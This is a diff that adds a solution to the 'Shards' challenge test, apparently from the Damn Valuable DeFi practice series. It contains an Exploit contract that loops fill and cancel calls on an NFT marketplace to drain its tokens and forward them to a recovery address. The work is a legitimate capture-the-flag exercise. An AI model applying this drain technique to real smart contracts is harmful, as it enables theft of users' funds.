@@ -115,6 +115,8 @@ contract ShardsChallenge is Test {
      */
     function test_shards() public checkSolvedByPlayer {
         
+
+        Exploit exploit = new Exploit(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +136,22 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract Exploit {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        uint256 initialTokensInMarketplace = token.balanceOf(address(marketplace));
+        uint256 i = 0;
+        while (
+            initialTokensInMarketplace - token.balanceOf(address(marketplace))
+                <= initialTokensInMarketplace * 1e16 / 100e18
+        ) {
+            marketplace.fill(marketplace.offerCount(), 100);
+            marketplace.cancel(marketplace.offerCount(), i);
+            i += 1;
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
